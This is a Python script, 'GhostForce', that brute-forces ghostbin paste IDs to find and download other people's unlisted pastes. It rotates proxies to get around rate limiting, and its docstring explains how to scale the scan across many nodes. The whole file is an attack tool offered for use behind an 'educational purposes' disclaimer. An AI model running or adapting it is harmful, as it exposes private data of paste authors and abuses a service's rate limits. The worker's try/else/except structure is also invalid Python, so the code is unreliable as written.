#!/usr/bin/env python

"""
GhostForce (ab)uses the small keyspace of ghostbin paste ids when considered with the population.

Preleminary testing shows that there are roughly 67,000 pastes currently on ghostbin's servers.

The keyspace for the paste ids is only 32^5 (33,554,432) elements in size. 

This test script can find about 1 paste every 5 min per server. It is recommended to have about 100 
proxies per server. In theory a proxy list of ~10,000 proxies and 100 scanning nodes could search the entire
keyspace in aprox. 3.8 days.

Tested on Ubuntu 14.04. The build script would need to be ported for any other distro.

Install and Config:
	Master Node:
		tar -xf ./gf.tar
		cd GhostForce
		./list_gen.py
		mkdir ../back
		mv ./values/*.txt ../back
		Add proxies one per line in format ip,port in proxy_list.txt

	Configure scanning packages:
		cp back/[filename].txt GhostForce/values/newnode.txt
		tar -cf ./gf.tar ./GhostForce

	Deploy Node:
		tar -xf ./gf.tar
		cd GhostForce
		sudo ./build.sh
		./GhostForce.py

	Alternativally the scanning nodes need the following packages:
		python-dev 
		build-essential
		python-lxml
		python-bs4

GhostForce is provided for educational purposes only. No support should be implied, nor is offered.

"""
__author__ = "GhostForce[at]mailinator.com"

import itertools, string, requests, time, sys, random
from bs4 import BeautifulSoup
from my_pool import Pool



def worker(id):

	"""
	worker(id) 
		Takes the id to be tested and will either add an entry to duds.txt or validurls.txt. If a valid id 
		is found the contents are saved to a file named <id>.txt
	Functions local to worker()
		get_page(id)
			Takes a page id and attempts to return the raw html for that url. A random proxy is used to bypass 
			rate limiting.
		find_code(raw)
			Takes the raw html, parses out the user input from the paste.
	"""

	def get_page(id):
		""" 
		Returns the text of a requests object.
		"""
		proxy = random.choice(plist)
		proxies = {'https':'https://%s:%s'%(proxy[0],proxy[1])}
		print('sending request')
		try:
			r = requests.get('https://ghostbin.com/paste/%s'%(id),proxies=proxies, timeout=5)
			if r.status_code == 200 and not r.text:
				print('no body')
				return(None)
			if r.status_code == 420:
				print('status 420...')
				return(None)
			if 'Ghost got your paste?' not in r.text:
				print(r)
				return(r.text)
		except:
			return(None)


	def find_code(raw):
		""" 
		Returns the code section of the raw html 
		"""
		try:
			print('Found one paste id = %s '%(id))
			soup = BeautifulSoup(raw,'lxml')
			return(soup.find("div", {"id": "code"}))
		except:
			raise(ValueError)

	def main(id):
		"""
		Main logic of worker() also handles logging.
		"""
		raw = get_page(id)
		if raw != None:
			try:
				code = find_code(raw)
				with open('./validurls.txt','a') as f:
					f.write(str('https://ghostbin.com/paste/%s'%(id)))
					f.write('\r\n')
				with open('./%s.txt'%(id),'a') as b:
					b.write(str(code))
				return(id)
			else:
				with open('./duds.txt','a') as d:
					d.write(str(id))
					d.write('\r\n')
				return()
			except:
				return()
	main(id)


if __name__ == '__main__':

	with open('./proxy_list.txt') as pfile:
		plist = [i.strip('\n').split(',') for i in pfile.readlines()]

	with open('./values/newnode.txt','r') as fhandler:
		keys = [i.strip('\r\n') for i in fhandler.readlines()]

	p = Pool(20, 10)
	p.map(worker,keys)
